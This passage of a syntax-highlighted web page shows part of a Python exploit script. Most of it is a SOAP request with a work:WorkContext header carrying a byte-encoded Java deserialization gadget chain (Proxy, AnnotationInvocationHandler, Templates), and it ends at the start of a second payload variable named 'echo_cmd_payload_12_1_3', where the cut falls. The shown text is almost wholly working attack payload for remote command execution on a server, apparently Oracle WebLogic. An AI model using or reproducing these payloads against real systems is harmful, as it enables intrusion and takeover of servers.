index="6504"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6505"&gt;&lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="6506"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6507"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6508"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6509"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6510"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6511"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6513"&gt;&lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="6514"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6515"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6516"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6517"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6518"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6519"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6520"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6521"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6522"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6523"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6524"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6525"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6526"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6527"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6528"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6529"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6530"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6531"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6532"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="6533"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6534"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6535"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6536"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="6537"&gt;&lt;byte&gt;-31&lt;/byte&gt;&lt;/void&gt;&lt;void index="6538"&gt;&lt;byte&gt;39&lt;/byte&gt;&lt;/void&gt;&lt;void index="6539"&gt;&lt;byte&gt;-38&lt;/byte&gt;&lt;/void&gt;&lt;void index="6540"&gt;&lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="6541"&gt;&lt;byte&gt;-52&lt;/byte&gt;&lt;/void&gt;&lt;void index="6542"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6543"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6544"&gt;&lt;byte&gt;-53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6545"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6547"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6548"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6550"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6551"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6552"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6554"&gt;&lt;byte&gt;37&lt;/byte&gt;&lt;/void&gt;&lt;void index="6555"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6556"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6557"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6558"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6559"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6560"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6561"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6562"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6563"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6564"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6565"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6566"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6567"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6568"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6569"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6570"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6571"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6572"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6573"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6574"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6575"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6576"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6577"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6578"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6579"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6580"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6581"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6582"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6583"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6584"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="6585"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6586"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6587"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6588"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6589"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6590"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6591"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6592"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6593"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6594"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6595"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6597"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6598"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6599"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6600"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6601"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6602"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6603"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6604"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6605"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6606"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6607"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6608"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6609"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6610"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6611"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6612"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6613"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6614"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6615"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6616"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6617"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6618"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6619"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6620"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6621"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="6622"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6623"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6624"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6625"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6626"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6627"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6628"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6629"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6630"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6631"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6632"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6633"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6634"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6635"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6636"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6637"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6638"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6639"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6640"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6641"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="6642"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6643"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6644"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6645"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6646"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6647"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6648"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="6649"&gt;&lt;byte&gt;-54&lt;/byte&gt;&lt;/void&gt;&lt;void index="6650"&gt;&lt;byte&gt;-11&lt;/byte&gt;&lt;/void&gt;&lt;void index="6651"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6652"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="6653"&gt;&lt;byte&gt;-53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6654"&gt;&lt;byte&gt;126&lt;/byte&gt;&lt;/void&gt;&lt;void index="6655"&gt;&lt;byte&gt;-91&lt;/byte&gt;&lt;/void&gt;&lt;void index="6656"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6658"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6659"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6661"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6662"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6663"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6664"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6665"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6666"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6667"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6668"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6669"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6670"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6671"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6672"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6673"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6674"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6676"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6677"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6678"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6679"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6680"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6681"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6682"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6683"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6684"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6685"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6686"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6687"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6688"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="6689"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6690"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6691"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6692"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6694"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6695"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6696"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="6697"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6698"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6699"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6701"&gt;&lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="6702"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6703"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6704"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6705"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6706"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6707"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6708"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6709"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6710"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6711"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6712"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6713"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6714"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6715"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6716"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6717"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6718"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6719"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6720"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6721"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6722"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6724"&gt;&lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="6725"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6726"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6727"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6728"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6729"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6730"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6731"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6732"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6733"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6734"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6735"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="6736"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6737"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6738"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6739"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="6740"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6741"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6742"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6743"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6744"&gt;&lt;byte&gt;-38&lt;/byte&gt;&lt;/void&gt;&lt;void index="6745"&gt;&lt;byte&gt;-63&lt;/byte&gt;&lt;/void&gt;&lt;void index="6746"&gt;&lt;byte&gt;-61&lt;/byte&gt;&lt;/void&gt;&lt;void index="6747"&gt;&lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="6748"&gt;&lt;byte&gt;96&lt;/byte&gt;&lt;/void&gt;&lt;void index="6749"&gt;&lt;byte&gt;-47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6750"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6752"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6753"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6755"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6756"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6757"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6758"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6759"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6760"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6761"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6762"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6763"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6764"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6765"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6766"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6768"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="6769"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6770"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6771"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6772"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6773"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6774"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6775"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6776"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6777"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6778"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6779"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6780"&gt;&lt;byte&gt;63&lt;/byte&gt;&lt;/void&gt;&lt;void index="6781"&gt;&lt;byte&gt;64&lt;/byte&gt;&lt;/void&gt;&lt;void index="6787"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6788"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="6789"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="6793"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6797"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6798"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6800"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="6801"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6802"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6803"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6804"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6805"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6806"&gt;&lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="6807"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="6808"&gt;&lt;byte&gt;56&lt;/byte&gt;&lt;/void&gt;&lt;void index="6809"&gt;&lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="6811"&gt;&lt;byte&gt;126&lt;/byte&gt;&lt;/void&gt;&lt;void index="6813"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="6814"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6815"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6816"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6818"&gt;&lt;byte&gt;29&lt;/byte&gt;&lt;/void&gt;&lt;void index="6819"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6820"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6821"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6822"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6823"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6824"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6825"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6826"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6827"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6828"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6829"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6830"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6831"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6832"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6833"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6834"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6835"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6836"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6837"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6838"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6839"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6840"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6841"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6842"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6843"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6844"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6845"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6846"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6847"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6859"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6860"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6861"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt; &lt;/array&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">     &lt;/array&gt;</span></span><br><span class="line"><span class="string">      &lt;/java&gt;</span></span><br><span class="line"><span class="string">    &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">  &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">  &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Envelope&gt;"""</span></span><br><span class="line"></span><br><span class="line">echo_cmd_payload_12_1_3 = <span class="string">"""&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" 